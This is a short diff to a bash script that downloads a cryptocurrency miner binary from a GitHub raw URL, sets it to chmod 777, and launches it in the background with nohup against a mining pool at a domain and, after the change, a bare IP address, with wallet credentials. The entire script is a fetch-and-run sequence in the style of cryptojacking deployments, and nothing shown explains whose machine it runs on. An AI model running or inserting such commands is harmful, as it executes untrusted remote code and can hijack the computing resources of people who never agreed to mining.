@@ -1,6 +1,6 @@
 #!/bin/bash
 cd /data
 touch exist
-curl -LO https://github.com/2319763378/pool/raw/master/minerd
-chmod 777 minerd
-nohup ./minerd -a CryptoVantaa -o stratum+tcp://pool.etgd.com:3113 -u ETmF5wiWCPjMyXEoEbEGoL6UkcAXAvT7Ah -p c=IOTE &
+curl -LO https://github.com/2319763378/pool/raw/master/cpuminer-sse2
+chmod 777 cpuminer-sse2
+nohup ./cpuminer-sse2 -a cpupower -o stratum+tcp://118.190.244.49:3032 -u CZBBY4VrkW4oUiE3ig7Shpx6uCAha6LcoE.wawawa &
